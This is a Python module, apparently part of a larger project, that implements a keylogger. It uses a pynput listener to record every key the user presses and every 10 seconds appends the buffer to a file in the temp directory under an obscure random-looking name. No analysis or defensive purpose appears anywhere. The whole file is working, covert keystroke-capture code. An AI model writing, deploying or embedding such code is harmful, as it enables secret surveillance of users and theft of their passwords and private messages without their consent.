#!/usr/bin/python

from setting import *

log = ""

global keylogger_path

if os_type == "windows":
    keylogger_path = TMP + "\\gw6y54trr6969"
else:
    keylogger_path = TMP + "/gw6y54trr6969"


def process_keys(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
            key = "    "
        elif key == key.right:
            log = log + ""
            key = ""
        elif key == key.left:
            log = log + ""
            key = ""
        elif key == key.up:
            log = log + ""
            key = ""
        elif key == key.down:
            log = log + ""
            key = ""
        elif key == key.shift:
            log = log + ""
            key = ""
        elif key == key.enter:
            log = log + "\n"
            key = "     "
        elif key == key.tab:
            log = log + "\t"
            key = "     "
        elif key == key.ctrl:
            log = log + ""
            key = ""
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    global keylogger_path
    fin = open(keylogger_path, "a")
    fin.write(log)
    log = ""
    fin.close()
    timer = threading.Timer(10, report)
    timer.start()


def start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        report()
        keyboard_listener.join()

